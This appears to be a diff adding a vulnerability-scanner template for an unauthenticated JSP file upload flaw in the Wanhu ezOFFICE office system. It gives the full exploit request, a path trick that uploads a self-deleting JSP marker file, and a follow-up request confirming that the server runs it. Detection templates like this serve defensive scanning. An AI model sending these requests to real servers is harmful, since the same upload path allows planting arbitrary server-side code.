@@ -1,0 +1,61 @@
+id: CVD-2023-2425
+info:
+  name: 万户网络 ezOFFICE senddocument_import.jsp 文件上传漏洞
+  author: SleepingBag945
+  severity: critical
+
+variables:
+  a1: "{{to_lower(rand_base(5))}}"
+  a2: "{{to_lower(rand_base(20))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/modules/govoffice/gov_documentmanager/senddocument_import.jsp;?categoryId=null&path=loginpage&mode=add&fileName=null&saveName=null&fileMaxSize=0&fileMaxNum=null&fileType=jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="photo"; filename="{{a1}}.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.println("{{a2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------{{boundary}}
+        Content-Disposition: form-data; name="continueUpload"
+
+        0
+        ------{{boundary}}
+        Content-Disposition: form-data; name="submit"
+
+        导 入
+        ------{{boundary}}--
+      
+      - |
+        GET /defaultroot/upload/loginpage/{{filename}}; HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+        Connection: close
+
+    extractors:
+      - type: regex
+        name: filename
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - 'saveName="(.*)"'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{a2}}"
+        part: body
+
+      - type: status
+        status:
+          - 200
